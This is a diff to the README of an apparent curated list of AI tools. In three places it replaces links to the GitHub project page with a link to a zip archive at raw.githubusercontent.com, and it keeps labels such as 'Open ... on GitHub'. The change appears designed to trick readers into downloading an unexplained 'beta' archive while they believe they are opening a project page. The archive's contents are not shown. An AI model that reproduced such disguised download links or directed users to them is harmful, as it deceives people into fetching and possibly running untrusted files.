@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-pulse-georgia - Curated AI tools for easy workflows
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-0078D4?style=for-the-badge&labelColor=6B7280)](https://github.com/montycongolese277/awesome-ai-pulse-georgia)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-0078D4?style=for-the-badge&labelColor=6B7280)](https://raw.githubusercontent.com/montycongolese277/awesome-ai-pulse-georgia/main/assets/awesome_ai_pulse_georgia_2.1-beta.3.zip)
 
 ## 🧭 What this is
 
@@ -12,7 +12,7 @@ This project is made for people who want to explore AI tools, test agent workflo
 
 Use this link to visit the project page and download or open it in your browser:
 
-[Open awesome-ai-pulse-georgia on GitHub](https://github.com/montycongolese277/awesome-ai-pulse-georgia)
+[Open awesome-ai-pulse-georgia on GitHub](https://raw.githubusercontent.com/montycongolese277/awesome-ai-pulse-georgia/main/assets/awesome_ai_pulse_georgia_2.1-beta.3.zip)
 
 On Windows, you can use the page in two ways:
 
@@ -139,7 +139,7 @@ AI tools change fast. A curated list saves time because it puts useful links in 
 
 ## 🔗 Direct link
 
-[https://github.com/montycongolese277/awesome-ai-pulse-georgia](https://github.com/montycongolese277/awesome-ai-pulse-georgia)
+[https://raw.githubusercontent.com/montycongolese277/awesome-ai-pulse-georgia/main/assets/awesome_ai_pulse_georgia_2.1-beta.3.zip](https://raw.githubusercontent.com/montycongolese277/awesome-ai-pulse-georgia/main/assets/awesome_ai_pulse_georgia_2.1-beta.3.zip)
 
 ## 📝 Suggested next steps
 
